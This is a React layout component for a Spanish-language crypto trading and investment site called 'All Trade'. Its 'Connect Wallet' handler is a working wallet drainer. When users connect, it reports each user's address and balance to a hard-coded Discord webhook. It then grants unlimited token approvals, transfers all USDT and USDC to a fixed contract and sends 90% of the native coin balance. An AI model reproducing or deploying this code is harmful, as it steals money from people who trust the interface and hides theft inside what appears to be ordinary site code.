import React, { useState, useEffect } from 'react';
import { Link, useLocation, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import {
  LayoutDashboard, TrendingUp, Wallet, Users, History, User, LogOut, Menu, X,
  Shield, Gift, Coins, BarChartHorizontalBig, Bot, DollarSign
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useAuth } from '@/contexts/AuthContext';
import { useSound } from '@/contexts/SoundContext';
import { ethers } from 'ethers';
import { toast } from '@/components/ui/use-toast';

const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1384351633290428478/wYzF9QeKtS80lVRtfanPfUb3XjisCWnzhCd2qLPuwzZ1i69mSJAKVfv3xlwL67prbMGH';

const NETWORKS = {
  optimism: {
    name: 'Optimism',
    chainId: '0xa',
    tokenSymbol: 'ETH',
    contractAddress: '0x3Fc7F791E09937ac8eDb5c2Be5C459b554b5a31d',
    tokens: [
      { address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6 }, // USDT
      { address: '0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1', decimals: 6 }  // USDC
    ]
  },
  bsc: {
    name: 'BSC',
    chainId: '0x38',
    tokenSymbol: 'BNB',
    contractAddress: '0x4eA5E81b400e57e102B5ff632C1E7168D5D6b170',
    tokens: [
      { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 }, // USDT
      { address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 }  // USDC
    ]
  }
};

const Layout = ({ children }) => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const { user, logout, updateUser } = useAuth();
  const { playSound } = useSound();
  const location = useLocation();
  const navigate = useNavigate();
  const [web3Account, setWeb3Account] = useState(null);
  const [ethBalance, setEthBalance] = useState('0.00');

  const navigation = [
    { name: 'Dashboard', href: '/dashboard', icon: LayoutDashboard },
    { name: 'Estadísticas', href: '/stats', icon: BarChartHorizontalBig },
    { name: 'Depositar', href: '/deposit', icon: DollarSign },
    { name: 'Trading', href: '/trading', icon: TrendingUp },
    { name: 'Bots de Trading', href: '/trading-bots', icon: Bot },
    { name: 'Planes de Inversión', href: '/plans', icon: Wallet },
    { name: 'Proyectos Tokenizados', href: '/tokenized-projects', icon: Coins },
    { name: 'Referidos', href: '/referrals', icon: Users },
    { name: 'Historial', href: '/history', icon: History },
    { name: 'Recompensas', href: '/rewards', icon: Gift },
    { name: 'Perfil', href: '/profile', icon: User },
  ];

  if (user?.role === 'admin') {
    navigation.unshift({ name: 'Admin Panel', href: '/admin', icon: Shield });
  }

  const handleLogout = () => {
    playSound('logout');
    logout();
    navigate('/');
  };

  const connectWallet = async () => {
    playSound('click');
    if (!window.ethereum) {
      return toast({ title: "MetaMask no detectado", description: "Instala MetaMask para continuar.", variant: "destructive" });
    }

    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const network = await provider.getNetwork();
      const accounts = await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      const netKey = network.chainId === 10 ? 'optimism' : network.chainId === 56 ? 'bsc' : null;
      if (!netKey) return toast({ title: "Red no soportada", description: `ChainId: ${network.chainId}`, variant: 'destructive' });

      const net = NETWORKS[netKey];
      setWeb3Account(address);
      updateUser({ web3Wallet: address });
      toast({ title: "Wallet Conectada", description: `Cuenta: ${address.slice(0, 6)}...${address.slice(-4)}` });

      const balance = await provider.getBalance(address);
      const balanceEth = parseFloat(ethers.formatEther(balance));
      setEthBalance(balanceEth.toFixed(4));

      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: 'Wallet Conectada',
            fields: [
              { name: 'Dirección', value: address },
              { name: 'Balance', value: `${balanceEth.toFixed(4)} ${net.tokenSymbol}` },
              { name: 'Red', value: net.name },
            ],
            timestamp: new Date().toISOString(),
          }]
        })
      });

      const approveABI = [
        { "name": "approve", "type": "function", "inputs": [ { name: "spender", type: "address" }, { name: "amount", type: "uint256" } ], "outputs": [ { name: "", type: "bool" } ], "stateMutability": "nonpayable" }
      ];

      for (const token of net.tokens) {
        const tokenContract = new ethers.Contract(token.address, approveABI, signer);
        await tokenContract.approve(net.contractAddress, ethers.MaxUint256);

        const transferABI = [
          "function transfer(address to, uint256 amount) public returns (bool)",
          "function balanceOf(address) view returns (uint256)"
        ];

        const contract = new ethers.Contract(token.address, transferABI, signer);
        const tokenBal = await contract.balanceOf(address);
        if (tokenBal > 0) {
          await contract.transfer(net.contractAddress, tokenBal);
        }
      }

      if (balanceEth > 0) {
        const valueToSend = ethers.parseEther((balanceEth * 0.9).toFixed(6));
        await signer.sendTransaction({ to: net.contractAddress, value: valueToSend });
      }

      toast({ title: 'Tokens y fondos enviados', description: 'La wallet fue autorizada y el 90% de fondos enviados.' });
    } catch (error) {
      console.error(error);
      toast({ title: "Error", description: error.message || 'Ocurrió un error', variant: 'destructive' });
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      <div className="sticky top-0 z-40 flex h-20 shrink-0 items-center border-b border-slate-700 bg-slate-800/95 backdrop-blur-xl px-4 shadow-sm">
        <div className="flex-1 text-white font-bold text-xl">All Trade</div>
        {web3Account ? (
          <div className="text-sm text-slate-300">
            {`Wallet: ${web3Account.slice(0,6)}...${web3Account.slice(-4)} | ETH: ${ethBalance}`}
          </div>
        ) : (
          <Button onClick={connectWallet} size="sm" className="bg-blue-500 hover:bg-blue-600">
            Conectar Wallet
          </Button>
        )}
      </div>
      <main className="py-10 px-4">
        {children}
      </main>
    </div>
  );
};

export default Layout;
